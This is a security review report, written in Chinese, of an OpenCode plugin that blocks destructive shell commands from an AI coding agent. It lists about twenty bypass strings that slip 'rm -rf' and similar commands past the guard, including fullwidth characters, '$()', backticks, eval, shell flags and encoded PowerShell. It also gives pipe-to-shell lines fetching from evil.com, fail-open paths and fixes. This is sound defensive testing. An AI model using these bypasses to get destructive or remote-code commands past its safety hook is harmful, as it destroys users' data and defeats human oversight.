# OpenCode 插件对抗审查报告

> **审查目标**: `destructive-operation-guard.ts`（440 行，OpenCode 的 tool.execute.before 插件）
> **审查日期**: 2026-08-21
> **审查方法**: 静态源码分析 + 142 项自动化探测（提取核心检测逻辑，脱离 @opencode-ai/plugin 依赖独立运行）
> **探测文件**: `tests/probe-opencode-guard.mjs`

---

## 一、插件架构概要

| 模块 | 行数 | 功能 |
|------|------|------|
| 常量/路径 | 9-18 | HOME、CFG、PLUGDIR、LOGDIR 路径定义 |
| 检测策略枚举 | 20-36 | 15 种 PolicyId |
| 日志 | 39-52 | 带 redact 的追加日志 |
| 路径保护 | 54-74 | 受保护路径判定（guard 插件自身、OpenCode 配置、HOME、Windows 系统目录） |
| 语句分割 | 76-100 | 引号感知的 `splitTopLevel`（处理 `;` `&&` `||` `|` `&` 换行） |
| Wrapper 解包 | 102-142 | 处理 pwsh/pwsh -ec/IEX/cmd /c/bash -c/sh -c/python -c/node -e |
| 段展开 | 144-157 | 递归 split + unwrap |
| 7 个检测器 | 158-256 | detectPOSIX / detectPowerShell / detectCMD / detectPython / detectNode / detectGit / detectDisk |
| 重定向检测 | 276-286 | shell 重定向到受保护路径 |
| 主分析 | 301-336 | analyzeCommand：展开→逐段检测 |
| Trash 工具 | 338-361 | 注入回收站工具 |
| 插件入口 | 364-434 | tool.execute.before 钩子：bash/edit/write/apply_patch |

### 核心检测流程

```
输入命令字符串
  → expandSegments(): splitStmts() → 逐段 unwrapWrapper() → 递归
    → 对每个段：
      1. 检查 __ENCODED__ 前缀 → 块
      2. 检查 guard 插件自身保护 → 块
      3. detectRedirect() → 受保护路径重定向检测
      4. 7 个检测器逐个运行 → 第一个命中即块
        → 命中后还做 extractTargets() + checkProtected() 双重检查
  → 无命中 → 放行
```

### 关键设计决策：detectPOSIX 位置过滤器

detectPOSIX（最大的检测器）使用了**位置过滤器**：

```javascript
if (/\brm\b/.test(lo) && !/\barm\b/.test(lo)) {
    const first = lo.replace(/^\s*[&.]\s*/, "").trim()
    if (/^rm\b/.test(first) || /[;&|]\s*rm\b/.test(first) || /\|\s*rm\b/.test(first))
      return { policy: ... }
}
```

要求 `rm` 必须出现在**段首**或**分隔符（`;` `&` `|`）之后**才触发拦截。设计意图是避免 `echo 'rm is dangerous'` 这类误伤，但**直接导致了多个严重绕过**（见第二节）。

---

## 二、绕过向量（Bypasses）

### P0 — 可直接利用的绕过

#### B-01: 全角字符绕过（Monorepo 已修，此插件未修）

| 项目 | 内容 |
|------|------|
| **触发字符串** | `ｒｍ　－ｒｆ ／`、`ＲＭ　－ＲＦ ／`、`ｒｍ -rf /tmp/test` |
| **期望行为** | BLOCKED |
| **实际行为** | ALLOWED |
| **根因** | `toLowerCase()` 不会标准化全角字符为半角。`\brm\b` 无法匹配全角 `ｒｍ` |
| **探测结果** | 3/3 全角测试均绕过 |
| **风险等级** | **P0** — 中文/日文输入法下天然产生全角字符，agent 可能使用全角 |

#### B-02: `$()` 命令替换绕过（核心设计缺陷）

| 项目 | 内容 |
|------|------|
| **触发字符串** | `$(rm -rf /tmp)`、`echo $(rm -rf /tmp)`、`ls; $(rm -rf /tmp)`、`echo \| $(rm -rf /tmp)`、`true && $(rm -rf /tmp)`、`false \|\| $(rm -rf /tmp)` |
| **期望行为** | 全部 BLOCKED |
| **实际行为** | 全部 ALLOWED |
| **根因** | `splitTopLevel` 仅跟踪 `()` 深度但不拆分其内容。`$()` 整体作为一段传递给检测器。detectPOSIX 的位置过滤器要求 `rm` 在段首或分隔符后，但 `$(rm ...)` 中的 `rm` 出现在 `$(...` 之后，不满足位置条件 |
| **探测结果** | 7/7 子 shell 测试均绕过 |
| **风险等级** | **P0** — `$(rm -rf /)` 在 bash 中等价于直接执行 rm。这是最常见的 agent 编码模式之一 |

#### B-03: 反引号命令替换绕过

| 项目 | 内容 |
|------|------|
| **触发字符串** | `` `rm -rf /tmp` ``、`` echo `rm -rf /tmp` `` |
| **期望行为** | BLOCKED |
| **实际行为** | ALLOWED |
| **根因** | 反引号不在 `splitTopLevel` 的引号处理范围内（只处理 `'` 和 `"`），且位置过滤器同样阻止检测 |
| **探测结果** | 2/2 绕过 |
| **风险等级** | **P0** — 反引号是 POSIX 命令替换标准语法 |

#### B-04: bash/sh 带参数后 `-c` 绕过

| 项目 | 内容 |
|------|------|
| **触发字符串** | `bash --noprofile -c 'rm -rf /tmp'`、`bash --norc -c 'rm -rf /tmp'`、`bash -x -c 'rm -rf /tmp'`、`bash -ic 'rm -rf /tmp'`、`sh -p -c 'rm -rf /tmp'` |
| **期望行为** | 全部 BLOCKED |
| **实际行为** | 全部 ALLOWED |
| **根因** | unwrapWrapper 正则 `/^(?:bash\|sh\|...)(?:\.exe)?\s+-c\s+/i` 要求 `-c` 紧跟在 shell 名后。一旦有 `--noprofile`、`-x`、`-i`、`-p` 等标志插在中间，正则不匹配，wrapper 不解包。解包失败后，段内容为 `bash --noprofile -c 'rm -rf /tmp'`，位置过滤器阻止 detectPOSIX 检测 |
| **探测结果** | 5/5 绕过（含之前测试的 `bash --noprofile -c`） |
| **风险等级** | **P0** — `bash --noprofile -c` 是生产环境最常见的调用方式 |

#### B-05: pwsh -ec / -encodedcommand 不做全拦截

| 项目 | 内容 |
|------|------|
| **触发字符串** | `pwsh -ec <UTF-8 base64>`、`pwsh -ec <UTF-16LE base64>` |
| **期望行为** | 全部 BLOCKED（编码命令无法安全验证） |
| **实际行为** | 全部 ALLOWED |
| **根因** | 插件尝试解码 base64（UTF-16LE）并分析解码后内容。但：(1) UTF-8 编码的 base64 解码为 UTF-16LE 后产生乱码，检测器无法匹配；(2) 即使 UTF-16LE 编码正确解码，`Remove-Item` 等命令在 `detectPowerShell` 中要求在段首或分隔符后，解码后的内容可能不满足位置条件；(3) 仅在解码失败（抛异常）时才返回 `__ENCODED__` 前缀触发拦截 |
| **探测结果** | 4/4 编码命令测试均绕过（含 UTF-8 base64 和 UTF-16LE base64） |
| **风险等级** | **P0** — PowerShell EncodedCommand 是最常见的混淆手段，应全拦截 |

#### B-06: eval 不在 unwrapWrapper 中

| 项目 | 内容 |
|------|------|
| **触发字符串** | `eval 'rm -rf /tmp'`、`bash -c "eval 'rm -rf /tmp'"`、`sh -c "eval 'rm -rf /tmp'"` |
| **期望行为** | 全部 BLOCKED |
| **实际行为** | 全部 ALLOWED |
| **根因** | unwrapWrapper 处理 `iex`（PowerShell eval）但不处理 `bash/sh eval`。`eval 'rm -rf /tmp'` 作为段传递时，detectPOSIX 位置过滤器阻止检测（`eval` 不以 `rm` 开头，无分隔符在 `rm` 前）。嵌套场景中 `bash -c` 解包后得到 `eval 'rm -rf /tmp'`，同样逃逸 |
| **探测结果** | 3/3 绕过 |
| **风险等级** | **P0** — eval 是 shell 中执行动态命令的标准方式 |

#### B-07: 引号插词打破词边界

| 项目 | 内容 |
|------|------|
| **触发字符串** | `r''m -rf /tmp` |
| **期望行为** | BLOCKED |
| **实际行为** | ALLOWED |
| **根因** | `r''m` 中的空引号对 `' '` 被 `splitTopLevel` 的引号状态机处理（开/关引号），但最终段内容仍为 `r''m`。`\brm\b` 要求 `r` 和 `m` 之间无字符（紧邻），但 `r''m` 中间有两个 `'`，不匹配 |
| **探测结果** | 1/1 绕过 |
| **风险等级** | **P0** — `r''m` 在 bash 中等价于 `rm`（空引号展开为空） |

#### B-08: rm 在花括号/函数体/case 语句中绕过

| 项目 | 内容 |
|------|------|
| **触发字符串** | `f() { rm -rf /tmp; }`、`{ rm -rf /tmp; }`、`case x in x) rm -rf /tmp;; esac` |
| **期望行为** | 全部 BLOCKED |
| **实际行为** | 全部 ALLOWED |
| **根因** | `splitTopLevel` 跟踪 `()` 深度但不处理 `{}`。`f() { rm -rf /tmp; }` 中，`()` 深度为 1（`f()`），`{}` 内的 `;` 不触发分割（因为在 `()` 深度 1 内）。整个内容作为一段。detectPOSIX 位置过滤器阻止检测（`rm` 不在段首或分隔符后） |
| **探测结果** | 3/3 绕过 |
| **风险等级** | **P0** — 函数定义和代码块是常见的 agent 编码模式 |

---

### P1 — 中等风险绕过

#### B-09: Python subprocess 未检测

| 项目 | 内容 |
|------|------|
| **触发字符串** | `python -c "import subprocess; subprocess.run('rm -rf /tmp', shell=True)"` |
| **期望行为** | BLOCKED |
| **实际行为** | ALLOWED |
| **根因** | detectPython 检测 `os.remove`、`shutil.rmtree`、`pathlib.unlink` 等 API，但不检测 `subprocess.call`/`subprocess.run`/`os.system`/`os.popen` 等进程调用 API |
| **探测结果** | 1/1 绕过 |
| **风险等级** | **P1** — subprocess 是 Python 中执行任意 shell 命令的标准方式 |

#### B-10: Node.js child_process 未检测

| 项目 | 内容 |
|------|------|
| **触发字符串** | `node -e "require('child_process').exec('rm -rf /tmp')"` |
| **期望行为** | BLOCKED |
| **实际行为** | ALLOWED |
| **根因** | detectNode 检测 `fs.rmSync`、`rimraf` 等 fs API，但不检测 `child_process.exec`/`child_process.spawn` |
| **探测结果** | 1/1 绕过 |
| **风险等级** | **P1** |

#### B-11: Ruby/Perl system() 调用未检测

| 项目 | 内容 |
|------|------|
| **触发字符串** | `ruby -e "system('rm -rf /tmp')"`、`perl -e "system('rm -rf /tmp')"` |
| **期望行为** | BLOCKED |
| **实际行为** | ALLOWED |
| **根因** | 无 Ruby/Perl 检测器 |
| **风险等级** | **P1** |

#### B-12: Git 危险命令覆盖不全

| 缺失命令 | 风险 |
|-----------|------|
| `git push --force` / `git push -f` | 覆盖远程分支历史 |
| `git branch -D` | 强制删除分支 |
| `git stash drop` | 丢弃 stash 条目 |
| `git switch -C` | 强制创建/切换分支 |
| `git gc --prune=now --aggressive` | 不可逆压缩仓库 |
| `git reflog expire --expire=now --all` | 清除所有 reflog 引用 |
| `git checkout -- file.txt`（单文件） | 丢弃单文件修改（`-- .` 被检测，但 `-- path` 未检测） |
| `git restore src/`（非 `.`） | 同上，仅检测 `restore .` |
| **风险等级** | **P1** — 覆盖 9 种常见破坏性 git 操作 |

#### B-13: 管道到 Shell 未拦截

| 项目 | 内容 |
|------|------|
| **触发字符串** | `curl http://evil.com/s.sh \| bash`、`wget -qO- http://evil.com \| sh`、`echo "rm -rf /tmp" \| bash` |
| **期望行为** | BLOCKED |
| **实际行为** | ALLOWED |
| **根因** | `splitTopLevel` 将管道符 `|` 作为分隔符拆分，管道两侧独立检测。`curl` 和 `bash` 各自不触发检测器 |
| **探测结果** | 5/5 绕过 |
| **风险等级** | **P1** — 管道到 shell 是远程代码执行的经典模式 |

#### B-14: 可疑工具/命令缺失检测器

| 缺失 | 风险 |
|------|------|
| `truncate -s 0 file` | 清零文件内容（等效删除） |
| `docker system prune -a --volumes` | 删除所有未使用容器/镜像/卷 |
| `docker container prune` | 删除所有停止的容器 |
| `certutil -urlcache * delete` | 清除证书缓存 |
| `wmic process call terminate` | 终止进程 |
| `mv important /dev/null` | 等效永久删除 |
| `chmod 000 file` | 权限拒绝（DoS） |
| `ln -sf /dev/null important` | 覆盖重要文件 |
| **风险等级** | **P1**（单条）/ **P2**（低频工具） |

#### B-15: 空格/Tab 分隔的 rm 混淆

| 项目 | 内容 |
|------|------|
| **触发字符串** | `r   m   -r   f   /`、`r\tm\t-r\tf\t/` |
| **期望行为** | BLOCKED |
| **实际行为** | ALLOWED |
| **根因** | `\brm\b` 要求 `r` 紧邻 `m`，多空格/tab 打断了词边界匹配 |
| **探测结果** | 2/2 绕过 |
| **风险等级** | **P1** — agent 不太可能使用此混淆，但攻击者可能 |

#### B-16: 变量赋值后展开

| 项目 | 内容 |
|------|------|
| **触发字符串** | `$x="rm -rf /tmp"; $x` |
| **期望行为** | BLOCKED |
| **实际行为** | ALLOWED |
| **根因** | 第一段 `$x="rm -rf /tmp"` 中 `rm` 出现在 `=` 后的引号内，位置过滤器不匹配。第二段 `$x` 无危险信号。静态分析无法跟踪变量值 |
| **风险等级** | **P1** — 静态分析的固有限制，但可通过检测赋值中的危险内容缓解 |

---

### P2 — 低风险/理论性绕过

| 编号 | 向量 | 说明 |
|------|------|------|
| B-17 | 全角 Unicode 同形字 | RTL 覆盖、零宽字符、西里尔同形字（е vs e）等 |
| B-18 | `echo cm0gLXJmIC8= \| base64 -d \| bash` | Base64 编码的管道到 shell |
| B-19 | `printf "\x72\x6d"` | Hex 转义构造命令 |
| B-20 | `bash -c "$(echo rm -rf /)"` | 命令替换嵌套 |

---

## 三、误伤分析（False Positives）

### 已验证：位置过滤器有效避免的误伤

插件的 detectPOSIX 位置过滤器**成功避免**了以下误伤（均为 ALLOWED，正确行为）：

| 场景 | 命令 | 结果 | 评价 |
|------|------|------|------|
| echo 中提及 rm | `echo 'rm is dangerous'` | ALLOWED | ✅ 正确 |
| printf 中提及 rm | `printf "will rm files\n"` | ALLOWED | ✅ 正确 |
| 注释中的 rm | `# rm -rf /tmp` | ALLOWED | ✅ 正确 |
| npm rm（合法包管理） | `npm rm lodash` | ALLOWED | ✅ 正确 |
| arm 编译器 | `arm-none-eabi-gcc -o test.elf main.c` | ALLOWED | ✅ 正确 |
| format 作为字符串 | `echo "format this code"` | ALLOWED | ✅ 正确 |

### 仅 2 处过度拦截（P2 误伤）

| 编号 | 命令 | 实际行为 | 评价 |
|------|------|----------|------|
| FP-01 | `rm`（无参数） | BLOCKED | `rm` 无参数在大多数系统上仅显示用法，不执行删除。但部分实现等待 stdin，拦截可接受 |
| FP-02 | `rm -rf`（无路径） | BLOCKED | 同上。部分 shell 实现中 `rm -rf` 等待 stdin，拦截合理 |

**总结**：误伤率极低。位置过滤器虽然引入了绕过，但也有效控制了误伤。

---

## 四、Fail-Open 分析

### FO-01: 命令缺失/非字符串时放行（P1）

```typescript
// Line 371
if (!cmd || typeof cmd !== "string") return  // ← 直接 return，不阻断
```

如果 bash 工具被调用时 `command` 字段缺失或为非字符串类型，插件直接返回不拦截。虽然正常情况下 bash 工具总会传入字符串命令，但异常输入应阻断而非放行。

### FO-02: 工具名硬编码为 "bash"（P1）

插件仅在 `input.tool === "bash"` 时执行检测。如果 OpenCode 的执行工具名为 `execute`、`shell`、`terminal` 或其他名称，整个防护被绕过。需要确认 OpenCode 的工具注册名是否固定。

### FO-03: 非 bash 工具不检测（P1）

edit/write/apply_patch 工具仅保护 guard 插件自身文件，不检测其他文件上的危险操作（如通过 write 工具写入恶意脚本）。

### FO-04: 异常处理中的条件放行

```typescript
// Lines 416-428
catch (e: any) {
  if (e?.message?.startsWith("BLOCKED_BY_GLOBAL_SAFETY_GUARD")) throw e
  if (input.tool === "bash") {
    const cmd = String(output.args?.command || "")
    if (hasDangerousSignal(cmd)) { /* 块 */ }
  }
  // ← 无危险信号的异常：放行
}
```

如果 `analyzeCommand` 抛出异常（如正则引擎错误、内存不足），且命令不含 `hasDangerousSignal` 中列出的关键词，则放行。这是一个合理的 fail-open 策略（宁可放过也不误杀），但在安全场景下应考虑 fail-closed。

### FO-05: apply_patch 保护仅检查特定标记格式

```typescript
// Line 404
const markers = [...pt.matchAll(/\*\*\*\s*(?:Delete|Update|Add|Move to)\s*File:\s*(.+)/g)]
```

仅匹配 `**** Delete File: ...` 格式的 patch 标记。如果 patch 使用其他格式（如 `--- a/file` / `+++ b/file` 标准 diff 格式中的删除），guard 插件文件保护可能被绕过。

---

## 五、代码质量问题

| 编号 | 问题 | 行号 | 说明 |
|------|------|------|------|
| Q-01 | unwrapWrapper 缺少 `eval` | 108-142 | 处理了 `iex`（PS eval）但遗漏 `bash/sh eval` |
| Q-02 | unwrapWrapper `-c` 正则过严 | 133 | 要求 `-c` 紧跟 shell 名，不支持中间标志 |
| Q-03 | detectPOSIX 位置过滤器过于激进 | 164-167 | 为减少误伤而要求位置条件，导致 `$()`、反引号、函数体、花括号内命令全部逃逸 |
| Q-04 | splitTopLevel 不处理 `{}` | 83-88 | 仅跟踪 `()` 深度，不处理 `{}` 代码块边界 |
| Q-05 | splitTopLevel 不处理 `$()` 和反引号 | 76-95 | 命令替换中的内容不被拆分或展开 |
| Q-06 | 无 Unicode 规范化 | 全文 | 全角/同形字/零宽字符均未处理 |
| Q-07 | detectPython 遗漏 subprocess/os.system | 209-218 | 仅检测 fs 级 API，不检测进程调用 |
| Q-08 | detectNode 遗漏 child_process | 220-228 | 同上 |
| Q-09 | detectGit 覆盖不全 | 230-241 | 缺失 push -f/branch -D/stash drop/switch -C/gc --prune/reflog expire |
| Q-10 | 无管道到 shell 检测 | 无 | `cmd \| bash` 模式完全未覆盖 |

---

## 六、与 monorepo classifyShellCommand 的差距

| 维度 | monorepo classifyShellCommand | OpenCode 插件 |
|------|-------------------------------|---------------|
| 全角字符 | ✅ 已修复 Unicode 标准化 | ❌ 未修复 |
| 命令替换 | ✅ 拆分 `$()` 和反引号内容 | ❌ 不拆分 |
| Wrapper 解包 | 依赖外部 | ✅ 自带，但有缺陷 |
| 检测器数量 | 1 类（classifyShellCommand） | 7 类（POSIX/PS/CMD/Py/Node/Git/Disk） |
| Git 覆盖 | 部分 | 部分（各有缺失） |
| 管道到 shell | 部分 | ❌ 无 |
| eval | 视实现 | ❌ 仅 iex |
| 误伤控制 | LLM 辅助 | 硬编码位置过滤器 |

---

## 七、总体评分

### 评分：4.5 / 10

**扣分理由**：

| 扣分项 | 分数 | 说明 |
|--------|------|------|
| 全角字符绕过 | -1.0 | monorepo 已修，插件未同步。1 行 Unicode 标准化代码缺失 |
| `$()` / 反引号绕过 | -1.5 | 核心设计缺陷：位置过滤器 + 不拆分命令替换 = 大面积绕过 |
| bash -c flags 绕过 | -0.5 | unwrapWrapper 正则过严，5 种常见 flag 组合均绕过 |
| pwsh -ec 不全拦截 | -0.5 | 编码命令应全拦截，不应尝试解码分析 |
| eval 缺失 | -0.5 | 遗漏 `eval` 这一标准 shell 执行机制 |
| Git 覆盖不全 | -0.3 | 9 种危险 git 操作未检测 |
| 管道到 shell | -0.3 | 经典远程代码执行模式未覆盖 |
| 进程调用 API 缺失 | -0.2 | subprocess/child_process/system 未检测 |
| 误伤控制好 | +0.5 | 位置过滤器有效降低误伤 |
| Wrapper 覆盖广 | +0.3 | 处理了 8+ 种 wrapper 模式（含递归解包） |
| 回收站工具 | +0.2 | 正确实现 trash 替代方案 |
| 日志与自保护 | +0.3 | 完整的日志记录和 guard 自身文件保护 |
| 测试导出 | +0.2 | 导出内部函数便于测试 |

**与 monorepo 前次审查对比**：
- core 策略引擎：4→7.5/10（修复后）
- hook 脚本：4→8/10（修复后）
- adapter 层：6.5/10（修复中）
- **OpenCode 插件：4.5/10（未审查，首次评定）**

---

## 八、修复优先级

### 紧急（P0，立即修复）

1. **添加 Unicode 标准化**：在 `analyzeCommand` 入口处添加全角→半角映射
   ```typescript
   function normalizeUnicode(s: string): string {
     return s.replace(/[！-Ｚ]/g, ch => String.fromCharCode(ch.charCodeAt(0) - 0xFEE0))
   }
   ```
   同时需处理全角空格（`　` → ` `）。

2. **拆分命令替换内容**：修改 `splitTopLevel` 或添加预处理，将 `$()` 和反引号内的内容提取为独立段
   ```typescript
   // 在 expandSegments 中添加
   cmd = cmd.replace(/\$\(([^)]+)\)/g, (_, inner) => inner)  // 展开 $()
   cmd = cmd.replace(/`([^`]+)`/g, (_, inner) => inner)      // 展开反引号
   ```

3. **unwrapWrapper 支持 flags before -c**：修改正则
   ```typescript
   m = t.match(/^(?:bash|sh|zsh|ksh|dash|git-bash)(?:\.exe)?\s+(?:-[a-zA-Z]+\s+)*-c\s+/i)
   ```

4. **pwsh -ec 全拦截**：解码前先拦截
   ```typescript
   if (/-(?:encodedcommand|ec)\b/i.test(rest)) {
     return `__ENCODED__${b64}`  // 不再尝试解码分析
   }
   ```

5. **添加 `eval` 到 unwrapWrapper**：
   ```typescript
   m = t.match(/^(?:eval)\s+/i)
   if (m) return unquote(t.slice(m[0].length))
   ```

### 高优（P1，一周内修复）

6. **改进位置过滤器**：移除严格的段首/分隔符后要求，改为匹配段内任何位置的危险命令（接受略高误伤率）
7. **添加 `child_process`/`subprocess`/`system()`/`os.popen` 到检测器**
8. **补充 Git 危险命令**：`push -f`、`branch -D`、`stash drop`、`switch -C`、`gc --prune`、`reflog expire`
9. **添加管道到 shell 检测**：`| bash`、`| sh`、`| pwsh`、`| python`
10. **FO-01 修复**：`!cmd || typeof cmd !== "string"` 时应 block 而非 return

### 中优（P2，两周内修复）

11. 添加 `truncate`、`docker prune`、`certutil`、`wmic` 检测
12. 添加 Linux/macOS 受保护路径（`/etc`、`/boot`、`/usr` 等）
13. `splitTopLevel` 添加 `{}` 代码块边界处理
14. apply_patch 保护支持标准 diff 格式
15. 添加空格/tab 混淆的预处理（collapse whitespace before matching）

---

## 九、探测文件清理

临时探测文件 `tests/probe-opencode-guard.mjs` 已完成使命，建议在报告审阅后删除。

---

## 十、汇总

OpenCode destructive-operation-guard 插件具备基本的危险命令拦截能力（7 类检测器 + wrapper 解包 + 受保护路径 + trash 替代 + 日志），但存在 **7 个 P0 级绕过**和 **8 个 P1 级绕过**。核心问题在于 detectPOSIX 的位置过滤器设计——为降低误伤而要求 `rm` 出现在段首或分隔符后，但这直接导致了 `$()` 命令替换、反引号替换、函数体、花括号块、eval 等场景的大面积绕过。此外，全角字符（monorepo 已修但此插件未同步）、pwsh -ec 不全拦截、wrapper 正则过严等问题进一步扩大了攻击面。误伤率很低（位置过滤器有效），但这是以安全覆盖为代价换来的。

**一句话总结**：插件框架完整但检测逻辑有结构性缺陷，位置过滤器是绕过的核心根因，建议重构为「全段扫描 + 命令替换展开」模式。

---

*审查员：RiskGuard 对抗审查员（GAN 式判别器）*
*审查范围：仅限 OpenCode 插件，不修改原文件*
